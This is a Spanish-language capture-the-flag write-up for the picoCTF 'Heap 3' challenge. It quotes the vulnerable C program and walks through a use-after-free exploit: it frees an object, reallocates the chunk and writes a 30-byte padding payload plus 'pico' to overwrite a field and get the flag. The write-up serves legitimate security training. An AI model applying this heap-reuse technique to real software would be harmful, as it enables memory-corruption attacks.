# Heap 3

Este ejercicio nos da un programa y su código fuente. El programa ofrece las siguientes opciones:

```c
./chall

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice:
```

La primera opción imprime un valor y su dirección en memoria. La segunda permite guardar un objeto en el heap usando `malloc`:

```c
char* alloc = malloc(size);
printf("Data for flag: ");
fflush(stdout);
scanf("%s", alloc);
```

Existe una opción para liberar la memoria de `x`:

```c
case 5:
    free_memory();
    break;
```

```c
void free_memory() {
    free(x);
}
```

Aquí ocurre algo importante: el programa permite liberar el chunk de memoria donde está el valor de `x` y luego permite escribir un nuevo valor en el heap. Esto significa que podemos sobrescribir el contenido anterior. Al liberar el chunk que contiene la palabra "bico", el espacio queda marcado como libre, y si pedimos un nuevo `malloc`, se usará ese mismo espacio.

El objetivo del ejercicio es cambiar el valor de `bico` a `pico`:

```c
void check_win() {
  if (!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
}
```

Entonces, para resolver este ejercicio:

1. Liberamos el chunk de `x`, quedando libre.
2. Escribimos en el heap con `malloc`.
3. Imprimimos la flag con la opción correspondiente.

El objeto que se inserta en el heap es del tipo `object`:

```c
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

object *x;
```

Para sobrescribir el campo `flag`, debemos introducir 30 bytes (10+10+10) para llenar `a`, `b` y `c`, seguidos por `"pico"`.

Probamos con:

```bash
python2 -c 'print ("A" * 30 + b"pico")'
```

Salida:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico
```

Interacción con el binario:

```c
./chall

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 1
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x138166ce  ->   bico
+-------------+-----------+

Enter your choice: 5

Enter your choice: 2
Size of object allocation: 40
Data for flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico

Enter your choice: 1
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x138166ce  ->   pico
+-------------+-----------+

Enter your choice: 4
YOU WIN!!11!!
picoCTF{SECRETO}
```

¡Tenemos la flag!
